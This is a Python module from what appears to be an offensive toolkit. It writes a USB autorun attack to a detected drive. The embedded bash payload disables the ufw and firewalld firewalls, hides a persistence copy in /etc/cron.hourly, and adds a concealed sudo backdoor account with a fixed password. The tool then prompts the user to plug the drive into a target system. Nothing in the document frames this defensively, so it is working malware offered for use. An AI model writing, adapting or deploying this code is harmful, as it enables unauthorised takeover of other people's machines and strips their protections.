import os
import shutil
import stat
import subprocess
from colorama import Fore, Style
from utils.texts import t
from utils.helpers import clear_screen

def create_usb_virus(target_path):
    try:
        # Содержимое скрипта атаки
        virus_content = """#!/bin/bash
echo "[*] Starting security override..."
echo "[+] Disabling firewalls"
sudo ufw disable
sudo systemctl stop firewalld
sudo systemctl disable firewalld

echo "[+] Creating persistence"
sudo cp $0 /etc/cron.hourly/.system_update
sudo chmod +x /etc/cron.hourly/.system_update

echo "[+] Installing backdoor"
sudo useradd -m -s /bin/bash -G sudo .sysadmin
echo ".sysadmin:infected" | sudo chpasswd

echo "[!] System compromised! Backdoor active."
"""

        # Autorun файл
        autorun_content = """[autorun]
icon=system
label=System Files
action=Open system folder
open=autorun.sh
shell\open\command=autorun.sh
"""

        # Создание файлов
        with open(os.path.join(target_path, "autorun.sh"), "w") as f:
            f.write(virus_content)
        
        with open(os.path.join(target_path, "autorun.inf"), "w") as f:
            f.write(autorun_content)
        
        # Установка прав
        os.chmod(os.path.join(target_path, "autorun.sh"), 
                 stat.S_IRWXU | stat.S_IRGRP | stat.S_IXGRP | stat.S_IROTH | stat.S_IXOTH)

        print(f"{Fore.GREEN}[+] USB attack created at: {target_path}")
        print(f"{Fore.YELLOW}[!] Plug this USB into target system{Style.RESET_ALL}")

    except Exception as e:
        print(f"{Fore.RED}Error: {str(e)}{Style.RESET_ALL}")

def usb_attack():
    clear_screen()
    print(f"\n{Fore.MAGENTA}=== {t('usb_attack')} ==={Style.RESET_ALL}")
    
    # Автопоиск USB
    usb_path = None
    try:
        mounts = subprocess.check_output("mount", shell=True).decode()
        for line in mounts.split('\n'):
            if '/media/' in line or '/mnt/' in line:
                parts = line.split()
                if len(parts) > 2 and parts[0].startswith('/dev/sd'):
                    usb_path = parts[2]
                    break
    except:
        pass

    if usb_path:
        print(f"{Fore.CYAN}[*] Detected USB at: {usb_path}{Style.RESET_ALL}")
        create_usb_virus(usb_path)
    else:
        path = input("> Enter USB mount path: ")
        if os.path.exists(path):
            create_usb_virus(path)
        else:
            print(f"{Fore.RED}Path does not exist!{Style.RESET_ALL}")
    
    input(f"\n{t('press_enter')}")